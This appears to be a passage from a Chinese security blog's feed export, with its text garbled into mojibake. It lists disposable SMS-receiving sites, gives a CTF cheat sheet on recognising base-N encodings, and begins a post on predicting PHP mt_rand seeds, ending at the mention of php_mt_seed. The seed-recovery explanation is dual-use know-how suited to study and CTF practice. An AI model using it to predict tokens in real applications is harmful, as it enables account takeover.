<p>14ã€receivesmsonlineï¼š<a href="https://www.receivesmsonline.net/">https://www.receivesmsonline.net</a></p>
<p>15ã€Receive SMS Onlineï¼š<a href="http://receive-sms-online.com/">http://receive-sms-online.com</a></p>
<p>16ã€MICSMSï¼š<a href="https://www.micsms.com/">https://www.micsms.com</a></p>
<p>17ã€éšç§çŸ­ä¿¡ï¼š<a href="https://www.yinsiduanxin.com/">https://www.yinsiduanxin.com</a></p>
<p>18ã€becmdï¼š<a href="https://www.becmd.com/">https://www.becmd.com</a></p>
<p>19ã€z-smsï¼š<a href="http://www.z-sms.com/">http://www.z-sms.com</a></p>
<p>20ã€éšç”¨éšå¼ƒï¼š<a href="https://www.suiyongsuiqi.com/">https://www.suiyongsuiqi.com</a></p>
<p>21ã€we39ï¼š<a href="https://www.we39.cn/">https://www.we39.cn</a></p>
]]></content>
      <categories>
        <category>å°å·¥å…·</category>
      </categories>
  </entry>
  <entry>
    <title>Cryptoä¸­å¯èƒ½ç”¨çš„å¯†ç </title>
    <url>/2022/12/19/Crypto%E4%B8%AD%E5%8F%AF%E8%83%BD%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="å¸¸è§çš„å¯†ç ç‰¹å¾"><a href="#å¸¸è§çš„å¯†ç ç‰¹å¾" class="headerlink" title="å¸¸è§çš„å¯†ç ç‰¹å¾"></a>å¸¸è§çš„å¯†ç ç‰¹å¾</h1><h2 id="baseå¯†ç "><a href="#baseå¯†ç " class="headerlink" title="baseå¯†ç "></a>baseå¯†ç </h2><h3 id="base100"><a href="#base100" class="headerlink" title="base100"></a>base100</h3><p><strong>ç‰¹ç‚¹ï¼šå¯†æ–‡ç”± Emoji è¡¨æƒ…ç»„æˆã€‚</strong></p>
<table>
<thead>
<tr>
<th>åŸæ–‡</th>
<th>base100åŠ å¯†</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>ğŸ‘ğŸ‘£ğŸ‘˜ğŸ‘</td>
</tr>
<tr>
<td>flag{gycfev123FGH_}</td>
<td>ğŸ‘ğŸ‘£ğŸ‘˜ğŸ‘ğŸ‘²ğŸ‘ğŸ‘°ğŸ‘šğŸ‘ğŸ‘œğŸ‘­ğŸ¨ğŸ©ğŸªğŸ½ğŸ¾ğŸ¿ğŸ‘–ğŸ‘´</td>
</tr>
</tbody></table>
<h3 id="base92"><a href="#base92" class="headerlink" title="base92"></a>base92</h3><p><em>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±92ä¸ªå­—ç¬¦ï¼ˆ0-9ï¼Œa-zï¼ŒA-Z,!#$%&amp;()</em>+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}â€~ï¼‰*ç»„æˆ<br><strong>æ¯”base91å¤šä¸€ä¸ª ã€‚</strong></p>
<h3 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h3><p><strong>ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±91ä¸ªå­—ç¬¦ï¼ˆ0-9ï¼Œa-zï¼ŒA-Z,!#$%&amp;()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~â€ï¼‰ç»„æˆ ã€‚</strong></p>
<table>
<thead>
<tr>
<th>åŸæ–‡</th>
<th>base91åŠ å¯†</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>@iH&lt;Z</td>
</tr>
<tr>
<td>flag{ASD231fgh_hj}</td>
<td>@iH&lt;,{cSBMB.9*gkg}Q2S}A</td>
</tr>
</tbody></table>
<h3 id="base85"><a href="#base85" class="headerlink" title="base85"></a>base85</h3><p><strong>ç‰¹ç‚¹ï¼šå¥‡æ€ªçš„å­—ç¬¦æ¯”è¾ƒå¤šï¼Œä½†æ˜¯å¾ˆéš¾å‡ºç°ç­‰å·ã€‚</strong></p>
<table>
<thead>
<tr>
<th>åŸæ–‡</th>
<th>base85åŠ å¯†</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>Ao(mg</td>
</tr>
<tr>
<td>flag{}JK_gisyu</td>
<td>Ao(mgH[SLZ?Y&#x3D;(oH$â€™</td>
</tr>
</tbody></table>
<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><strong>ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±64ä¸ªå­—ç¬¦(A-Z,a-z,0-9,+,&#x2F;)ç»„æˆï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¯†æ–‡å°¾éƒ¨éƒ½ä¼šæœ‰ä¸¤ä¸ªç­‰å·ï¼Œæ˜æ–‡å¾ˆå°‘çš„æ—¶å€™åˆ™æ²¡æœ‰ï¼›</strong></p>
<table>
<thead>
<tr>
<th>åŸæ–‡</th>
<th>base64åŠ å¯†</th>
</tr>
</thead>
<tbody><tr>
<td>flag{asdfgs1sedfvfvdfd2345_}</td>
<td>ZmxhZ3thc2RmZ3Mxc2VkZnZmdmRmZDIzNDVffQ&#x3D;&#x3D;</td>
</tr>
<tr>
<td>flag{asdfgsdfd2345_}</td>
<td>ZmxhZ3thc2RmZ3NkZmQyMzQ1X30&#x3D;</td>
</tr>
<tr>
<td>flag</td>
<td>ZmxhZw&#x3D;&#x3D;</td>
</tr>
<tr>
<td>sdfdfc</td>
<td>c2RmZGZj</td>
</tr>
</tbody></table>
<h3 id="base62"><a href="#base62" class="headerlink" title="base62"></a>base62</h3><p><strong>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±62å­—ç¬¦ï¼ˆ0-9ï¼Œa-zï¼ŒA-Zï¼‰ç»„æˆ</strong></p>
<h3 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h3><p><strong>ç‰¹ç‚¹ï¼š Base58æ˜¯ç”¨äºBitcoinä¸­ä½¿ç”¨çš„ä¸€ç§ç‹¬ç‰¹çš„ç¼–ç æ–¹å¼ï¼Œä¸»è¦ç”¨äºäº§ç”ŸBitcoinçš„é’±åŒ…åœ°å€ï¼ŒBase58ä¸ä½¿ç”¨æ•°å­—â€0â€ï¼Œå­—æ¯å¤§å†™â€Oâ€ï¼Œå­—æ¯å¤§å†™â€Iâ€ï¼Œå’Œå­—æ¯å°å†™â€lâ€ï¼Œä»¥åŠâ€+â€å’Œâ€&#x2F;â€ç¬¦å·</strong></p>
<table>
<thead>
<tr>
<th>åŸæ–‡</th>
<th>base58åŠ å¯†</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>3cr9Ae</td>
</tr>
<tr>
<td>flag{4561230ASDO}</td>
<td>xpoetRNMzw3NmoorXfTgNTn</td>
</tr>
</tbody></table>
<h3 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h3><p><strong>ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±36ä¸ªå­—ç¬¦ï¼ˆ0-9,a-zï¼‰ç»„æˆï¼ŒåŠ å¯†ä»…æ”¯æŒæ•´æ•°æ•°å­—ï¼Œè§£å¯†ä»…æ”¯æŒå­—ç¬¦ä¸²ï¼Œä¸æ”¯æŒä¸­æ–‡ å¯†æ–‡ç”±36ä¸ªå­—ç¬¦ï¼ˆ0-9,A-Zï¼‰</strong></p>
<table>
<thead>
<tr>
<th>åŸæ–‡</th>
<th>base36åŠ å¯†</th>
</tr>
</thead>
<tbody><tr>
<td>123456</td>
<td>2n9c</td>
</tr>
<tr>
<td>10</td>
<td>a</td>
</tr>
<tr>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>11</td>
<td>b</td>
</tr>
</tbody></table>
<h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p><strong>ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±32ä¸ªå­—ç¬¦ï¼ˆA-Z,2-7)ç»„æˆï¼Œæœ«å°¾å¯èƒ½ä¼šæœ‰â€˜&#x3D;â€™ï¼Œä½†æœ€å¤šæœ‰6ä¸ªã€‚</strong></p>
<table>
<thead>
<tr>
<th>åŸæ–‡</th>
<th>base32åŠ å¯†</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>MZWGCZY&#x3D;</td>
</tr>
<tr>
<td>flag{123asd}</td>
<td>MZWGCZ33GEZDGYLTMR6Q&#x3D;&#x3D;&#x3D;&#x3D;</td>
</tr>
<tr>
<td>flag{123asd_sxvhgjh}</td>
<td>MZWGCZ33GEZDGYLTMRPXG6DWNBTWU2D5</td>
</tr>
</tbody></table>
<h3 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h3><p><strong>ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±16ä¸ªå­—ç¬¦ï¼ˆ0-9,A-Fï¼‰ã€‚</strong></p>
<table>
<thead>
<tr>
<th>åŸæ–‡</th>
<th>base16åŠ å¯†</th>
</tr>
</thead>
<tbody><tr>
<td>flag</td>
<td>666C6167</td>
</tr>
<tr>
<td>flag{dujv_1236}</td>
<td>666C61677B64756A765F313233367D</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>phpä¹‹ä¼ªéšæœºæ•°çˆ†ç ´</title>
    <url>/2022/12/17/php%E4%B9%8B%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="PHPçš„ä¼ªéšæœºæ•°çˆ†ç ´"><a href="#PHPçš„ä¼ªéšæœºæ•°çˆ†ç ´" class="headerlink" title="PHPçš„ä¼ªéšæœºæ•°çˆ†ç ´"></a>PHPçš„ä¼ªéšæœºæ•°çˆ†ç ´</h1><h2 id="éšæœºæ•°å¹¶ä¸éšæœº"><a href="#éšæœºæ•°å¹¶ä¸éšæœº" class="headerlink" title="éšæœºæ•°å¹¶ä¸éšæœº"></a>éšæœºæ•°å¹¶ä¸éšæœº</h2><p>é¦–å…ˆéœ€è¦å£°æ˜çš„æ˜¯ï¼Œè®¡ç®—æœºä¸ä¼šäº§ç”Ÿç»å¯¹éšæœºçš„éšæœºæ•°ï¼Œè®¡ç®—æœºåªèƒ½äº§ç”Ÿâ€œä¼ªéšæœºæ•°â€ã€‚å…¶å®ç»å¯¹éšæœºçš„éšæœºæ•°åªæ˜¯ä¸€ç§ç†æƒ³çš„éšæœºæ•°ï¼Œå³ä½¿è®¡ç®—æœºæ€æ ·å‘å±•ï¼Œå®ƒä¹Ÿä¸ä¼šäº§ç”Ÿä¸€ä¸²ç»å¯¹éšæœºçš„éšæœºæ•°ã€‚è®¡ç®—æœºåªèƒ½ç”Ÿæˆç›¸å¯¹çš„éšæœºæ•°ï¼Œå³ä¼ªéšæœºæ•°ã€‚</p>
<p><strong>ä¼ªéšæœºæ•°å¹¶ä¸æ˜¯å‡éšæœºæ•°ï¼Œè¿™é‡Œçš„â€œä¼ªâ€æ˜¯æœ‰è§„å¾‹çš„æ„æ€ï¼Œå°±æ˜¯è®¡ç®—æœºäº§ç”Ÿçš„ä¼ªéšæœºæ•°æ—¢æ˜¯éšæœºçš„åˆæ˜¯æœ‰è§„å¾‹çš„ã€‚</strong>  æ€æ ·ç†è§£å‘¢ï¼Ÿäº§ç”Ÿçš„ä¼ªéšæœºæ•°æœ‰æ—¶éµå®ˆä¸€å®šçš„è§„å¾‹ï¼Œæœ‰æ—¶ä¸éµå®ˆä»»ä½•è§„å¾‹ï¼›ä¼ªéšæœºæ•°æœ‰ä¸€éƒ¨åˆ†éµå®ˆä¸€å®šçš„è§„å¾‹ï¼›å¦ä¸€éƒ¨åˆ†ä¸éµå®ˆä»»ä½•è§„å¾‹ã€‚æ¯”å¦‚â€œä¸–ä¸Šæ²¡æœ‰ä¸¤ç‰‡å½¢çŠ¶å®Œå…¨ç›¸åŒçš„æ ‘å¶â€ï¼Œè¿™æ­£æ˜¯ç‚¹åˆ°äº†äº‹ç‰©çš„ç‰¹æ€§ï¼Œå³éšæœºæ€§ï¼Œä½†æ˜¯æ¯ç§æ ‘çš„å¶å­éƒ½æœ‰è¿‘ä¼¼çš„å½¢çŠ¶ï¼Œè¿™æ­£æ˜¯äº‹ç‰©çš„å…±æ€§ï¼Œå³è§„å¾‹æ€§ã€‚ä»è¿™ä¸ªè§’åº¦è®²ï¼Œä½ å¤§æ¦‚å°±ä¼šæ¥å—è¿™æ ·çš„äº‹å®äº†ï¼š<strong>è®¡ç®—æœºåªèƒ½äº§ç”Ÿä¼ªéšæœºæ•°è€Œä¸èƒ½äº§ç”Ÿç»å¯¹éšæœºçš„éšæœºæ•°</strong>ã€‚</p>
<p><strong>çœŸéšæœºæ•°å’Œä¼ªéšæœºæ•°çš„æ¦‚å¿µ</strong></p>
<ul>
<li>çœŸéšæœºæ•°å‘ç”Ÿå™¨ï¼šè‹±æ–‡ä¸ºï¼štrue random number generators ï¼Œç®€ç§°ä¸ºï¼šTRNGsï¼Œæ˜¯åˆ©ç”¨ä¸å¯é¢„çŸ¥çš„ç‰©ç†æ–¹å¼æ¥äº§ç”Ÿçš„éšæœºæ•°ã€‚</li>
<li>ä¼ªéšæœºæ•°å‘ç”Ÿå™¨ï¼šè‹±æ–‡ä¸ºï¼špseudo-random number generators ï¼Œç®€ç§°ä¸ºï¼šPRNGsï¼Œæ˜¯è®¡ç®—æœºåˆ©ç”¨ä¸€å®šçš„ç®—æ³•æ¥äº§ç”Ÿçš„ã€‚</li>
</ul>
<h2 id="PHPçš„ä¼ªéšæœºæ•°æœ‰å…³çš„ä¸¤ä¸ªå‡½æ•°"><a href="#PHPçš„ä¼ªéšæœºæ•°æœ‰å…³çš„ä¸¤ä¸ªå‡½æ•°" class="headerlink" title="PHPçš„ä¼ªéšæœºæ•°æœ‰å…³çš„ä¸¤ä¸ªå‡½æ•°"></a>PHPçš„ä¼ªéšæœºæ•°æœ‰å…³çš„ä¸¤ä¸ªå‡½æ•°</h2><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><p>mt_rand() å‡½æ•°ä½¿ç”¨ Mersenne Twister ç®—æ³•è¿”å›éšæœºæ•´æ•°ï¼ˆéšæœºæ•°ç”Ÿæˆå™¨ï¼‰ã€‚</p>
<p><strong>è¯­æ³•</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_rand</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span>max<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>è¯´æ˜</strong></p>
<p>å¦‚æœæ²¡æœ‰æä¾›å¯é€‰å‚æ•° min å’Œ maxï¼Œmt_rand() è¿”å› 0 åˆ° RAND_MAX ä¹‹é—´çš„ä¼ªéšæœºæ•°ã€‚</p>
<p>å¾ˆå¤šè€çš„ libc çš„éšæœºæ•°å‘ç”Ÿå™¨å…·æœ‰ä¸€äº›ä¸ç¡®å®šå’ŒæœªçŸ¥çš„ç‰¹æ€§è€Œä¸”å¾ˆæ…¢ã€‚PHP çš„ rand() å‡½æ•°é»˜è®¤ä½¿ç”¨ libc  éšæœºæ•°å‘ç”Ÿå™¨ã€‚mt_rand() å‡½æ•°æ˜¯éæ­£å¼ç”¨æ¥æ›¿æ¢å®ƒçš„ã€‚è¯¥å‡½æ•°ç”¨äº† Mersenne Twister  ä¸­å·²çŸ¥çš„ç‰¹æ€§ä½œä¸ºéšæœºæ•°å‘ç”Ÿå™¨ï¼Œå®ƒå¯ä»¥äº§ç”Ÿéšæœºæ•°å€¼çš„å¹³å‡é€Ÿåº¦æ¯” libc æä¾›çš„ rand() å¿«å››å€ã€‚</p>
<p><strong>ä¾‹å­</strong></p>
<p>åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä¼šè¿”å›ä¸€äº›éšæœºæ•°ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¾“å‡ºç±»ä¼¼ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">3150906288</span>
<span class="token number">513289678</span>
<span class="token number">35</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><p>mt_srand() æ’­ç§ Mersenne Twister éšæœºæ•°ç”Ÿæˆå™¨ã€‚</p>
<p><strong>è¯­æ³•</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å‚æ•° seedï¼šè§„å®šæ’­ç§å€¼ã€ç”¨ seed æ¥ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ã€‚</p>
<p><strong>ä¾‹å­</strong><br> åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†æ’­ç§éšæœºæ•°ç”Ÿæˆå™¨ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">mktime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¾“å‡ºç±»ä¼¼ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1132656473</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿™æ®µä»£ç çš„æ„æ€æ˜¯ï¼Œæ˜¯é€šè¿‡mt_srandåˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œæ‰èƒ½é mt_rand()æ¥ç”Ÿæˆéšæœºæ•°ã€‚</p>
<h4 id="ä¸ºä»€ä¹ˆéšæœºæ•°è¦ç”¨ç§å­æ’­ç§ï¼Œå¯¹ç§å­çš„ç†è§£"><a href="#ä¸ºä»€ä¹ˆéšæœºæ•°è¦ç”¨ç§å­æ’­ç§ï¼Œå¯¹ç§å­çš„ç†è§£" class="headerlink" title="ä¸ºä»€ä¹ˆéšæœºæ•°è¦ç”¨ç§å­æ’­ç§ï¼Œå¯¹ç§å­çš„ç†è§£"></a>ä¸ºä»€ä¹ˆéšæœºæ•°è¦ç”¨ç§å­æ’­ç§ï¼Œå¯¹ç§å­çš„ç†è§£</h4><p>é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ï¼Œè®¡ç®—æœºä¸èƒ½äº§ç”Ÿç»å¯¹çš„éšæœºæ•°ï¼Œåªèƒ½äº§ç”Ÿä¼ªéšæœºæ•°ã€‚ä¼ªå°±æ˜¯æœ‰è§„å¾‹çš„æ„æ€ã€‚ä¼ªéšæœºæ•°å°±æ˜¯è¯´è®¡ç®—æœºäº§ç”Ÿçš„éšæœºæ•°æ˜¯æœ‰è§„å¾‹çš„ã€‚é‚£ä¹ˆè®¡ç®—æœºæ˜¯æ€ä¹ˆäº§ç”Ÿéšæœºæ•°çš„ï¼Ÿå½“ç„¶æ˜¯é€šè¿‡ç®—æ³•ï¼Œè¿™ä¸ªç®—æ³•æ˜¯æœ‰æ˜ å°„å…³ç³»çš„ï¼Œå¦‚æˆ‘æ”¾è¿›1ï¼Œä»–ä¼šå‡ºæ¥ä¸€ä¸ªç‰¹å®šçš„æ•°</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">RAND_SEED</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">RAND_SEED</span><span class="token operator">*</span><span class="token number">123</span><span class="token operator">+</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">65536</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿™æ˜¯æŸä¸ªç³»ç»Ÿçš„éšæœºæ•°ç®—æ³•ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªç®—æ³•çœ‹æˆæ˜¯ä¸€ä¸ªé»‘ç›’å­ï¼Œä½ æ”¾è¿›ä¸€ä¸ªæ•°ï¼Œå°±ä¼šå‡ºæ¥ä¸€ä¸ªç‰¹å®šçš„æ•°ï¼Œå¹¶æŠŠè¿™ä¸ªæ•°å½“åšä¸‹ä¸€æ¬¡çš„ç§å­åœ¨æ”¾è¿›å»ã€‚åœ¨è¿™é‡Œï¼Œä½ ç¬¬ä¸€æ¬¡æ”¾è¿›å»çš„æ•°å°±æ˜¯éšæœºæ•°ç§å­ï¼Œä¹Ÿå°±æ˜¯è¯´éšæœºç§å­ï¼ˆRandom Seedï¼‰å°±æ˜¯è¿™äº›éšæœºæ•°çš„åˆå§‹å€¼ã€‚</p>
<p>ç³»ç»Ÿå®ç°éšæœºæ•°æ˜¯æŠŠå½“å‰çš„ç³»ç»Ÿæ—¶é—´æ”¾è¿›å»ï¼Œæ¯æ¬¡æ—¶é—´éƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥å®ç°æ¯æ¬¡å‡ºæ¥çš„æ•°éƒ½ä¸ä¸€æ ·ã€‚å¦‚æœä½ æ¯æ¬¡éƒ½æ”¾è¿›ä¸€æ ·çš„ç§å­ï¼Œç”Ÿæˆçš„éšæœºæ•°åˆ—å°±æ˜¯ä¸€æ ·çš„äº†ã€‚</p>
<p>æ³¨é‡Šï¼šè‡ª PHP 4.2.0 èµ·ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– mt_srand() å‡½æ•°ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§äº†ï¼Œéšæœºæ•°ç”Ÿæˆå™¨å¯ä»¥è‡ªåŠ¨æ’­ç§ï¼Œå› æ­¤æ²¡æœ‰å¿…è¦ä½¿ç”¨è¯¥å‡½æ•°ã€‚</p>
<h2 id="PHPä¼ªéšæœºæ•°å®‰å…¨"><a href="#PHPä¼ªéšæœºæ•°å®‰å…¨" class="headerlink" title="PHPä¼ªéšæœºæ•°å®‰å…¨"></a>PHPä¼ªéšæœºæ•°å®‰å…¨</h2><h3 id="å¯é¢„æµ‹æ€§"><a href="#å¯é¢„æµ‹æ€§" class="headerlink" title="å¯é¢„æµ‹æ€§"></a>å¯é¢„æµ‹æ€§</h3><p>mt_rand()å¹¶ä¸æ˜¯ä¸€ä¸ªçœŸéšæœºæ•°ç”Ÿæˆå‡½æ•°ï¼Œå®é™…ä¸Šç»å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­çš„éšæœºæ•°å‡½æ•°ç”Ÿæˆçš„éƒ½æ˜¯ä¼ªéšæœºæ•°ã€‚</p>
<p><strong>ä¼ªéšæœºæ˜¯ç”±å¯ç¡®å®šçš„å‡½æ•°ï¼Œé€šè¿‡ä¸€ä¸ªç§å­ï¼ˆå¸¸ç”¨æ—¶é’Ÿï¼‰æ’­ç§ï¼Œäº§ç”Ÿçš„ä¼ªéšæœºæ•°ã€‚è¿™æ„å‘³ç€ï¼šå¦‚æœçŸ¥é“äº†ç§å­ï¼Œæˆ–è€…å·²ç»äº§ç”Ÿçš„éšæœºæ•°ï¼Œæˆ–è€…å·²çŸ¥äº§ç”Ÿçš„éšæœºæ•°çš„ä¸€éƒ¨åˆ†ï¼Œéƒ½å¯èƒ½è·å¾—æ¥ä¸‹æ¥éšæœºæ•°åºåˆ—çš„ä¿¡æ¯ï¼ŒçŸ¥é“äº†ä½ çš„éšæœºæ•°åºåˆ—ï¼Œå°±å¯ä»¥ç¡®å®šä½ çš„ç§å­å€¼ã€‚ ï¼ˆå¯é¢„æµ‹æ€§ï¼‰ã€‚</strong></p>
<p><strong>ç®€å•å‡è®¾ä¸€ä¸‹ mt_rand()å†…éƒ¨ç”Ÿæˆéšæœºæ•°çš„å‡½æ•°ä¸º: rand &#x3D; seed+(i*10) å…¶ä¸­ seed æ˜¯éšæœºæ•°ç§å­ï¼Œ i è¡¨ç¤ºç¬¬å‡ æ¬¡è°ƒç”¨è¿™ä¸ªéšæœºæ•°å‡½æ•°ã€‚å½“æˆ‘ä»¬åŒæ—¶çŸ¥é“ i å’Œ rand ä¸¤ä¸ªå€¼çš„æ—¶å€™ï¼Œå°±èƒ½å¾ˆå®¹æ˜“çš„ç®—å‡ºseedçš„å€¼æ¥ã€‚æ¯”å¦‚ rand&#x3D;21 , i&#x3D;2 ä»£å…¥å‡½æ•° 21&#x3D;seed+(2*10) å°±èƒ½å¾—åˆ° seed&#x3D;1 ã€‚æ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°seedä¹‹åï¼Œå°±èƒ½è®¡ç®—å‡ºå½“ i ä¸ºä»»æ„å€¼æ—¶å€™çš„ rand çš„å€¼äº†ã€‚</strong></p>
<h3 id="PHPçš„è‡ªåŠ¨æ’­ç§"><a href="#PHPçš„è‡ªåŠ¨æ’­ç§" class="headerlink" title="PHPçš„è‡ªåŠ¨æ’­ç§"></a>PHPçš„è‡ªåŠ¨æ’­ç§</h3><p>æˆ‘ä»¬å·²ç»çŸ¥é“æ¯ä¸€æ¬¡mt_rand()è¢«è°ƒç”¨éƒ½ä¼šæ ¹æ®seedå’Œå½“å‰è°ƒç”¨çš„æ¬¡æ•°iæ¥è®¡ç®—å‡ºä¸€ä¸ªä¼ªéšæœºæ•°ã€‚è€Œä¸”seedæ˜¯è‡ªåŠ¨æ’­ç§çš„ï¼š</p>
<blockquote>
<p>Note: è‡ª PHP 4.2.0 èµ·ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– mt_srand() ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ï¼Œå› ä¸ºç°åœ¨æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ã€‚</p>
</blockquote>
<p>é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œåˆ°åº•ç³»ç»Ÿè‡ªåŠ¨å®Œæˆæ’­ç§æ˜¯åœ¨ä»€ä¹ˆæ—¶å€™ï¼Œå¦‚æœæ¯æ¬¡è°ƒç”¨mt_rand()éƒ½ä¼šè‡ªåŠ¨æ’­ç§é‚£ä¹ˆç ´è§£seedä¹Ÿå°±æ²¡æ„ä¹‰äº†ã€‚</p>
<p>ä¸å¹¸çš„æ˜¯ï¼Œphpæ¯æ¬¡è°ƒç”¨mt_rand()å‡½æ•°æ—¶ï¼Œéƒ½ä¼šå…ˆæ£€æŸ¥æ˜¯å¦å·²ç»æ’­ç§ã€‚å¦‚æœå·²ç»æ’­ç§å°±ç›´æ¥äº§ç”Ÿéšæœºæ•°ï¼Œå¦åˆ™è°ƒç”¨php_mt_srandæ¥æ’­ç§ã€‚ä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªphp cgiè¿›ç¨‹æœŸé—´ï¼Œåªæœ‰ç¬¬ä¸€æ¬¡è°ƒç”¨mt_rand()ä¼šè‡ªåŠ¨æ’­ç§ã€‚æ¥ä¸‹æ¥éƒ½ä¼šæ ¹æ®è¿™ä¸ªç¬¬ä¸€æ¬¡æ’­ç§çš„ç§å­æ¥ç”Ÿæˆéšæœºæ•°ã€‚</p>
<p><strong>php_mt_seed</strong></p>
